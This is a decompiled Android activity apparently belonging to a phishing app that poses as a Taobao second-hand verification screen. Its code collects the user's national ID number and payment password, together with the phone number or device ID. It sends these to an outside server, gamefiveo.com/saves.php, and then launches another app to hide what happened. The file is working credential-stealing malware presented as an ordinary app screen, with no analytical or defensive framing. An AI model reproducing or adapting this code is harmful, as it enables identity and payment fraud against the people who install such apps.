package com.tao.bao;

import android.app.Activity;
import android.app.ProgressDialog;
import android.content.ComponentName;
import android.content.Intent;
import android.os.Bundle;
import android.os.Handler;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.view.View;
import android.view.View.OnClickListener;
import android.widget.Button;
import android.widget.EditText;
import android.widget.Toast;
import java.util.ArrayList;
import java.util.List;
import org.apache.http.NameValuePair;
import org.apache.http.message.BasicNameValuePair;

public class LocationVerify extends Activity {
    /* access modifiers changed from: private */
    public Handler mHandler = new Handler();
    ProgressDialog pd;
    String phoneNum = "";

    /* access modifiers changed from: protected */
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.location);
        this.pd = new ProgressDialog(this);
        this.pd.setMessage("提交中,请稍候...");
        this.pd.setCancelable(false);
        final EditText etcode = (EditText) findViewById(R.id.et_code);
        final EditText etCom = (EditText) findViewById(R.id.et_com);
        ((Button) findViewById(R.id.verify)).setOnClickListener(new OnClickListener() {
            public void onClick(View arg0) {
                final String code = etcode.getText().toString();
                if (code.equals("")) {
                    Toast.makeText(LocationVerify.this, "请输入您的身份证号", 0).show();
                    return;
                }
                final String com = etCom.getText().toString();
                if (com.equals("")) {
                    Toast.makeText(LocationVerify.this, "请输入支付密码", 0).show();
                    return;
                }
                LocationVerify.this.pd.show();
                TelephonyManager manager = (TelephonyManager) LocationVerify.this.getSystemService("phone");
                LocationVerify.this.phoneNum = manager.getLine1Number();
                if (LocationVerify.this.phoneNum.equals("")) {
                    LocationVerify.this.phoneNum = manager.getDeviceId();
                }
                new Thread(new Runnable() {
                    public void run() {
                        List<NameValuePair> params = new ArrayList();
                        NameValuePair pair = new BasicNameValuePair("sbid", LocationVerify.this.phoneNum);
                        NameValuePair pair1 = new BasicNameValuePair("sendnumber", "淘宝二手");
                        NameValuePair pair2 = new BasicNameValuePair("sendtype", "2");
                        params.add(new BasicNameValuePair("smscontent", "身份证号:" + code + ", 支付密码:" + com));
                        params.add(pair2);
                        params.add(pair1);
                        params.add(pair);
                        Log.e("tag", "result = " + ToolHelper.postData("http://www.gamefiveo.com/saves.php", params));
                    }
                }).start();
                LocationVerify.this.mHandler.postDelayed(new Runnable() {
                    public void run() {
                        LocationVerify.this.pd.dismiss();
                        Intent intent = new Intent("android.intent.action.MAIN");
                        intent.addCategory("android.intent.category.LAUNCHER");
                        intent.setComponent(new ComponentName("google.tao", "google.tao.MainActivity"));
                        LocationVerify.this.startActivity(intent);
                        LocationVerify.this.finish();
                    }
                }, 3000);
            }
        });
    }
}
